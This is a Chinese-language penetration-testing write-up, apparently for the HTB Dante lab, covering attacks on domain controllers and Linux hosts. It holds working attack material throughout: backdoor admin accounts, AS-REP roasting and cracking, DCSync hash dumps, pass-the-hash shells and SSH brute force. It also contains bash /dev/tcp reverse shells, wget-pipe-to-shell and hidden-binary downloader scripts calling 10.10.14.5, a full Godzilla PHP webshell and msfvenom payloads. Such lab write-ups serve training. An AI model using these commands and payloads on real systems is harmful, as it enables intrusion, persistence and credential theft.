WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dante.local:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: DANTE-DC01.DANTE.local
ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0905FB, comment: AcceptSecurityContext error, data 52e, v2580
Traceback (most recent call last):
  File "/home/kali/.local/bin//bloodhound-python", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 338, in main
    bloodhound.run(collect=collect,
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 79, in run
    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 523, in prefetch_info
    self.get_objecttype()
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 240, in get_objecttype
    self.ldap_connect()
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py", line 69, in ldap_connect
    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py", line 119, in getLDAPConnection
    raise CollectionException('Could not authenticate to LDAP. Check your credentials and LDAP server requirements.')
bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.
```

### 添加后门用户
使用 meterpreter 添加后门用户，注意密码要符合密码策略。
```bash
meterpreter > run post/windows/manage/enable_rdp username="dummykitty" password="!QAZ2wsx#EDC"

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     Terminal Services service is already set to auto
[*]     Opening port in local firewall if necessary
[*] Setting user account for logon
[*]     Adding User: dummykitty with Password: !QAZ2wsx#EDC
[*]     Adding User: dummykitty to local group 'Remote Desktop Users'
[*]     Hiding user from Windows Login screen
[*]     Adding User: dummykitty to local group 'Administrators'
[*] You can now login with the created user
```
或者手动在 shell 中执行。
```bash　　　　
net user dummykitty !QAZ2wsx#EDC /add
net localgroup administrators dummykitty /add   
```
如果目标机器没有开启远程桌面服务，修改注册表。
```bash
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

添加完后不知道为什么都无法正常登陆。

### 主机存活性扫描
常规的一些网络发现命令如下，但都没有发现其他网段。
```powershell
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

在 DC01 中扫描 172.16.2.0/24 网段，可以发现存活主机 172.16.2.5
```powershell
C:\Windows\system32>(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
Reply from 172.16.2.5: bytes=32 time<1ms TTL=127
```


## Windows: 172.16.2.5 (DANTE-DC02)
### 端口扫描
172.16.2.5 主机只有 172.16.1.20 可以访问。msf 可以借助 172.16.1.20 中的 session 自动添加路由，然后对 172.16.2.5 进行端口扫描。

在 172.16.1.20 的 session 中执行 autoroute 
```bash
meterpreter > run autoroute -s 172.16.2.0/24
```
然后使用 auxiliary/scanner/portscan/tcp 进行端口扫描。
```bash
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.2.5
RHOSTS => 172.16.2.5
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/portscan/tcp) > run
```
端口开放情况如下：
```bash
[+] 172.16.2.5:           - 172.16.2.5:53 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:88 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:139 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:135 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:389 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:445 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:464 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:593 - TCP OPEN
[+] 172.16.2.5:           - 172.16.2.5:636 - TCP OPEN
```
目标开放了 88 端口，很有可能是另外一台 DC。
### 搭建代理: chisel/msf
也可以上传 chisel.exe，开启一个新的 socks 代理，reverse 模式下，server 部署在本地，远程可以直接连接到此前运行的服务端。
```bash
start /b ch.exe client 10.10.14.5:12345 R:0.0.0.0:1088:socks
```
使用 fscan 扫描
```bash
fscan -h 172.16.2.0/24 -socks5 127.0.0.1:1088 -p "1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,88,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535" -o 172.16.2.5_fscan_result.txt

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
Socks5Proxy: socks5://127.0.0.1:1088
start infoscan
172.16.2.5:53 open
172.16.2.5:88 open
172.16.2.5:135 open
172.16.2.5:139 open
172.16.2.5:389 open
172.16.2.5:445 open
172.16.2.5:5985 open
172.16.2.5:47001 open
[*] alive ports len is: 8
start vulscan
[*] NetInfo:
[*]172.16.2.5
   [->]DANTE-DC02
   [->]172.16.2.5
[*] WebTitle: http://172.16.2.5:47001   code:404 len:315    title:Not Found
[*] WebTitle: http://172.16.2.5:5985    code:404 len:315    title:Not Found
已完成 8/8
[*] 扫描结束,耗时: 8m38.713472155s

```
fscan 扫描出了 172.16.2.5 机器名为 DANTE-DC02，且开放了 5985 端口。

搭建代理也可以直接使用 msf
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1082
run
```
### 通过 SMB 匿名枚举用户名
```bash
p -q -f ./proxychains_1088.conf crackmapexec smb 172.16.2.5 --users

SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10.0 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
SMB         172.16.2.5      445    DANTE-DC02       [-] Error enumerating domain users using dc ip 172.16.2.5: NTLM needs domain\username and a password
SMB         172.16.2.5      445    DANTE-DC02       [*] Trying with SAMRPC protocol
```

cme 获取到了域名 DANTE.ADMIN

### 通过 Kerbrute 枚举用户名
通过 socks5 代理 kerbrute 进行扫描。
```bash
p -q -f ./proxychains_1088.conf kerbrute userenum -d dante --dc 172.16.2.5 users.txt
```
users.txt 中包含了 DANTE.local 域中的用户名：
```bash
asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley
julian
ben
balthazar
mrb3n
```
目标环境可能存在一些问题，扫描时经常会出现：
```bash
[Root cause: Encoding_Error] Encoding_Error: failed to unmarshal KDC's reply: asn1: syntax error: sequence truncated                                   
```
查看其他 writeup 才知道存在 jbercov@dante 用户。
### ASREProast
针对没有启用 Kerberos 预身份验证的用户，可以使用 ASREProast 获取用户的 TGT，此过程不需要具备域账户，只需要与 KDC 建立连接即可进行攻击。


```bash
p -f proxychains_1088.conf GetNPUsers.py dante/jbercov -no-pass -dc-ip 172.16.2.5 -outputfile kerberoasting.hashes

[proxychains] Strict chain  ...  127.0.0.1:1088  ...  172.16.2.5:88  ...  OK
$krb5asrep$23$jbercov@DANTE:ddb1e0b115be8c818771b834539efef3$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07
```
### john/hashcat 破解 krb5asrep
得到 hash 之后可以通过 hashcat 或者 john 进行破解。
```bash
hashcat -m 18200 --force -a 0 kerberoasting.hashes /webtools/dicts/rockyou.txt
```
成功爆破出密码：myspace7
```
$krb5asrep$23$jbercov@DANTE:ddb1e0b115be8c818771b834539efef3$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07:myspace7
```

使用 john 进行破解。
```bash
john kerberoasting.hashes --wordlist=/webtools/dicts/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace7         ($krb5asrep$23$jbercov@DANTE)     
1g 0:00:00:00 DONE (2023-12-29 04:14) 4.000g/s 57344p/s 57344c/s 57344C/s havana..cherry13
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

jbercov/myspace7

获取到用户名密码之后，目标开启了 5985 端口，因此可以使用 evil-winrm 连接。
```bash
p -q -f proxychains_1088.conf evil-winrm -i 172.16.2.5 -u  jbercov -p myspace7 -s /webtools/movement/PowerSharpPack/PowerSharpBinaries
```
在用户 Desktop 目录可以找到 flag.txt

### 提权: DACL 滥用导致 DCSync
借助 evil-winrm，我们可以直接加载 winPEASE，将执行结果保存在文件中，然后将结果文件下载回来，但 winPEAS 结果中并没有太多有用的信息。
```bash
Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS >> .out
```
在拥有凭证的情况下，我们可以使用 bloodhound 来获取更多信息。bloodhound-python 可以使用如下的命令，但会出现 DNS 服务器无法解析的问题。

```bash
p -q -f proxychains_1082.conf bloodhound-python --zip -c All -d dante -u jbercov -p myspace7 -dc 172.16.2.5 -ns 172.16.2.5 --dns-tcp
```

执行 PowerSharpPack 中的 Invoke-SharpHound4 会出现报错。

考虑直接上传 SharpHound.exe 然后执行 `-c all`
```powershell
*Evil-WinRM* PS C:\temp> .\sh.exe -c all
2023-12-29T14:03:24.7826199+00:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-12-29T14:03:24.8920174+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-12-29T14:03:24.9089993+00:00|INFORMATION|Initializing SharpHound at 14:03 on 29/12/2023
2023-12-29T14:03:25.0013614+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for DANTE.ADMIN : DANTE-DC02.DANTE.ADMIN
2023-12-29T14:03:25.0169982+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-12-29T14:03:25.1263707+00:00|INFORMATION|Beginning LDAP search for DANTE.ADMIN
2023-12-29T14:03:25.1419972+00:00|INFORMATION|Producer has finished, closing LDAP channel
2023-12-29T14:03:25.1419972+00:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-12-29T14:03:55.9584256+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-12-29T14:04:09.6121665+00:00|INFORMATION|Consumers finished, closing output channel
2023-12-29T14:04:09.6433466+00:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-12-29T14:04:09.7527055+00:00|INFORMATION|Status: 92 objects finished (+92 2.090909)/s -- Using 42 MB RAM
2023-12-29T14:04:09.7527055+00:00|INFORMATION|Enumeration finished in 00:00:44.6321094
2023-12-29T14:04:09.8151969+00:00|INFORMATION|Saving cache with stats: 51 ID to type mappings.
 52 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-12-29T14:04:09.8308184+00:00|INFORMATION|SharpHound Enumeration Completed at 14:04 on 29/12/2023! Happy Graphing!
```

导入结果之后查看 JBERCOV 的信息，可以发现 JBERCOV 用户具备 GetChangesAll 权限，而 GetChangesAll 权限意味着可以利用 DCSync 导出域内的所有 hash。

![20231229082415](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231229082415.png)

<!-- ![Alt text](../../../../../assets/image-10.png) -->

通常情况下 DCSync 权限仅有管理员、域管理员、企业管理员和域控制器组的成员才具备，但这里 JBERCOV 用户并不是管理员用户，属于 DACL 滥用。

域服务中资源的访问权限通常通过使用访问控制条目 (ACE) 来授予，DACL（Active Directory 自主访问控制列表）是由 ACE（访问控制条目）组成的列表，用于标识允许或拒绝访问对象的用户和组。

DACL 滥用通常可以使用 BloodHound、Powersploit 中的 Get-DomainObjectAcl 来进行枚举。

DACL 滥用的思维导图如下：
![20231229082957](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231229082957.png)

<!-- ![Alt text](../../../../../assets/image-11.png) -->

接着我们可以使用 secretdump 来导出域控中的 hash
```bash
p -q -f proxychains_1088.conf secretsdump.py -outputfile 172.16.2.5_DCSync DANTE.ADMIN/jbercov:myspace7@172.16.2.5
```
结果如下：
```bash
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:698534680cb407112e87a196bccb2e1f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
DANTE-DC02$:aes256-cts-hmac-sha1-96:ad70e34f55fb662789158a2a9fd111aa2042a651e518e5e83b8592c35d9f3bce
DANTE-DC02$:aes128-cts-hmac-sha1-96:4c917008232d55247ef311d89437a078
DANTE-DC02$:des-cbc-md5:b5497fb9eac17f5d
[*] Cleaning up...
```
### 提权: Hash 传递
有了 Administrator 的 Hash 之后，我们可以使用 Pass the Hash 来获取 Administrator 权限。
```bash
p -q -f proxychains_1088.conf psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8' 'DANTE.ADMIN/Administrator@172.16.2.5'

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.2.5.....
[*] Found writable share ADMIN$
[*] Uploading file kvzbKpgP.exe
[*] Opening SVCManager on 172.16.2.5.....
[*] Creating service fuZm on 172.16.2.5.....
[*] Starting service fuZm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

c:\Users\Administrator\Desktop 下有 flag.txt 和 Note.txt，Note.txt 内容如下，提示我们其实可以通过枚举 DC01 的浏览器记录来找到 172.16.2.0/24 网段。
```bash
You were supposed to find this subnet via enumerating the browser history files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.
```
c:\Users\Administrator\Documents 目录下还有一个 Jenkins.bat 文件。
```bash
net user Admin_129834765 SamsungOctober102030 /add
```
得到了一个用户凭证，可能与 172.16.1.19 中的 jenkins 有关。

除了使用 impacket 中的 psexec.py 外，msf 中也集成了模块利用。
```bash
use exploit/windows/smb/psexec
set rhosts 172.16.2.5
set proxies socks5:127.0.0.1:1088
set smbuser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
set lhost 10.10.14.5
set reverseallowproxy true
set DisablePayloadHandler true
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1235
run
```

### 主机存活性扫描
得到域控权限后，可以进一步探测 172.16.2.0/24 网段存活的主机。
```powershell
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"

Reply from 172.16.2.5: bytes=32 time<1ms TTL=128
Reply from 172.16.2.101: bytes=32 time<1ms TTL=64
```
172.16.2.0/24 除了域控只有 172.16.2.101 这台主机

## Linux: 172.16.2.101
### 端口扫描
在 172.16.2.5 使用 msf 对 172.16.2.101 进行端口扫描
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.2.101
set THREADS 10
run
```
仅开放一个 ssh 服务
```bash
[+] 172.16.2.101:         - 172.16.2.101:22 - TCP OPEN
```

### SSH 爆破
msf 中可以使用 auxiliary/scanner/ssh/ssh_login 模块来爆破 ssh
```bash
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt
set RHOSTS 172.16.2.101
set VERBOSE true
set ThREADS 10
run

[*] 172.16.2.101:22 - Starting bruteforce
[-] 172.16.2.101:22 - Failed: 'asmith:Princess1'
[!] No active DB -- Credential data will not be saved!
[-] 172.16.2.101:22 - Failed: 'smoggat:Summer2019'
[-] 172.16.2.101:22 - Failed: 'tmodle:P45678!'
[-] 172.16.2.101:22 - Failed: 'ccraven:Password1'
[-] 172.16.2.101:22 - Failed: 'kploty:Teacher65'
[-] 172.16.2.101:22 - Failed: 'jbercov:4567Holiday1'
[-] 172.16.2.101:22 - Failed: 'whaguey:acb123'
[-] 172.16.2.101:22 - Failed: 'dcamtan:WorldOfWarcraft67'
[-] 172.16.2.101:22 - Failed: 'tspadly:RopeBlackfieldForwardslash'
[-] 172.16.2.101:22 - Failed: 'ematlis:JuneJuly1TY'
[-] 172.16.2.101:22 - Failed: 'fglacdon:FinalFantasy7'
[-] 172.16.2.101:22 - Failed: 'tmentrso:65RedBalloons'
[-] 172.16.2.101:22 - Failed: 'dharding:WestminsterOrange5'
[-] 172.16.2.101:22 - Failed: 'smillar:MarksAndSparks91'
[-] 172.16.2.101:22 - Failed: 'bjohnston:Bullingdon1'
[-] 172.16.2.101:22 - Failed: 'iahmed:Sheffield23'
[-] 172.16.2.101:22 - Failed: 'plongbottom:PowerfixSaturdayClub777'
[-] 172.16.2.101:22 - Failed: 'jcarrot:Tanenbaum0001'
[-] 172.16.2.101:22 - Failed: 'lgesley:SuperStrongCantForget123456789'
[+] 172.16.2.101:22 - Success: 'julian:manchesterunited' 'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX05 5.4.0-39-generic #43-Ubuntu SMP Fri Jun 19 10:28:31 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 5 opened (10.10.14.5-10.10.110.3:57306 -> 172.16.2.101:22) at 2024-01-01 20:49:15 -0500

```
登陆成功之后 msf 会自动打开一个 ssh session

### 提权至 root: polkit:CVE-2021-3560
使用 linPEAS 进行提权信息收集
```bash
## linPEAS
nc -lvnp 9002 | tee linpeas.out #Host
wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim
```

反弹一个 shell 到 pwncat，方便上传下载文件。
```bash
/bin/bash -i >& /dev/tcp/10.10.14.5/9897 0>&1
```

Dante 靶场可能比较老了，基本上 linux 提权都可以用 polkit:CVE-2021-3560 打通，上传 trator 可以直接提权到 root。

### 提权: SUID 文件溢出漏洞提权
linPEAS 结果文件中关于 SUID 文件的描述存在如下的一个条目，readfile 并不是 linux 原生的二进制文件。
```bash
-rwsr-sr-x 1 root julian 17K Jun 30  2020 /usr/sbin/readfile (Unknown SUID binary!)
```
原思路是利用 readfile 中存在的溢出漏洞提权至 root。

### 主机存活性探测
再在 172.16.2.101 中使用 ping 探测主机存活时，可以额外扫出来一个 172.16.2.6，此前在 172.16.2.5 中没有扫描出该主机的原因可能在于防火墙策略的限制。
```bash
for i in {1..255};do (ping -c 1 172.16.2.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done

172.16.2.5
172.16.2.6
172.16.2.101
```
### 反弹 msf meterpreter
为了进一步渗透 172.16.2.6，我们可以反弹一个 msf meterpreter。
```bash
wget -q -O- 10.10.14.5:9999/downloader.sh|bash
```
downloader.sh 内容：
```bash
#!/bin/bash
wget -q http://10.10.14.5:9999/test -O .te
chmod +x .te
nohup ./.te &
```
在新获取的 meterpreter 中添加路由：
```bash
run autoroute -s 172.16.2.6
```
## Linux: 172.16.2.6
### 端口扫描
在 172.16.2.101 使用 msf 对 172.16.2.6 进行端口扫描
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.2.6
set THREADS 10
run
```
172.16.2.6 也同样仅开放 22 端口。

使用 julian:manchesterunited 可以成功登陆。
### SSH 爆破
同样可以 SSH 爆破，下面的两个凭证均可以正常登陆
- plongbottom:PowerfixSaturdayClub777
- julian:manchesterunited

```bash
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt
set RHOSTS 172.16.2.6
set VERBOSE true
set ThREADS 10
run

[+] 172.16.2.6:22 - Success: 'plongbottom:PowerfixSaturdayClub777' 'uid=1000(plongbottom) gid=1000(plongbottom) groups=1000(plongbottom),27(sudo) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 7 opened (10.10.14.5-10.10.110.3:42542 -> 172.16.2.6:22) at 2024-01-01 21:43:33 -0500
[-] 172.16.2.6:22 - Failed: 'jcarrot:Tanenbaum0001'
[-] 172.16.2.6:22 - Failed: 'lgesley:SuperStrongCantForget123456789'
[+] 172.16.2.6:22 - Success: 'julian:manchesterunited' 'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 8 opened (10.10.14.5-10.10.110.3:46782 -> 172.16.2.6:22) at 2024-01-01 21:43:56 -0500
```

msf 会自动反弹 shell，但这个 shell 不是很稳定，反弹到 pwncat 时出现 time out，可能是有防火墙
```bash
/bin/bash -i >& /dev/tcp/10.10.14.5/9897 0>&1

-bash: connect: Connection timed out
-bash: line 5: /dev/tcp/10.10.14.5/9896: Connection timed out
```

可以考虑直接在 172.16.2.101 中使用 ssh 登陆 172.16.2.6
```bash
ssh plongbottom@172.16.2.6
```
### 获取 SQL 凭证
julian 的 home 目录可以找到一个 flag 和一个 SQL 文件：
```bash
root@DANTE-ADMIN-NIX06:/home/julian/Desktop# cat SQL 
Hi Julian
I've put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I've reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James

```
可以获取到一个 sql 凭证：
- Sophie/TerrorInflictPurpleDirt996655


### 提权: sudoers
plongbottom 用户属于 sudoers，因此可以直接 su 提权。

注意 msf 获取的反向 shell 无法使用 tty，sudo 会报错。
```bash
sudo su
sudo: no tty present and no askpass program specified
```




## Windows: 172.16.1.13
开放端口：
```bash
172.16.1.13	80
172.16.1.13	443
172.16.1.13	445
```

### 80 端口 RCE
80 端口部署了一个 XAMPP。/phpinfo.php 可以访问 phpinfo。/phpmyadmin 只能通过本机 IP 进行登陆。

爆破 web 目录可以得到：
1. /cgi-bin/printenv.pl 可以输出一些环境信息。
2. /discuss 可以进入一个 Dante Technical Discussion Forum 页面。

页面提供了注册功能，可以注册一个用户，登陆之后可以修改用户信息，修改界面存在 sql 注入。
```
## country 返回 1
un=dr34d&fn=dr34d&pwd=dr34d&e_mail=dr34d%40gmail.com&gender=1&dob=1987-08-21&ima=images.jpeg&add=USA&sta=USA&cou=USA'or+1=1#

## country 返回 0
un=dr34d&fn=dr34d&pwd=dr34d&e_mail=dr34d%40gmail.com&gender=1&dob=1987-08-21&ima=images.jpeg&add=USA&sta=USA&cou=USA'or+1=1#
```
并且如果对 /discuss/ 目录进行扫描，可以发现 /discuss/db/，可直接下载数据库文件 tech_forum.sql。

最后发现存在历史漏洞：
- [Online Discussion Forum Site 1.0 - Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/48512)

注册的时候可以上传一个 webshell。上传成功后进行登陆，然后可以在 /ups/ 目录下访问。

简单的 eval webshell 会被杀，但杀软并不强，godzilla PHP_XOR_BASE64 可以正常上传。
```php
<?php
@session_start();
@set_time_limit(0);
@error_rfsting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```
得到 webshell 后可以在 C:\Users\gerald\Desktop 下找到 flag.txt

Godzilla 中直接反弹 msf meterpreter 会断掉，生成一个 msf windows https 载荷。
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=8443 -f exe -o wintest.txt
```
msfconsole 中执行：
```bash
set payload payload/windows/x64/meterpreter/reverse_https
set LPOrt 8443
set exitonsession false
exploit -j
```
在 webshell 中用 wget 下载载荷。
```bash
powershell wget http://10.10.14.5:9999/wintest.txt -o test.exe
```
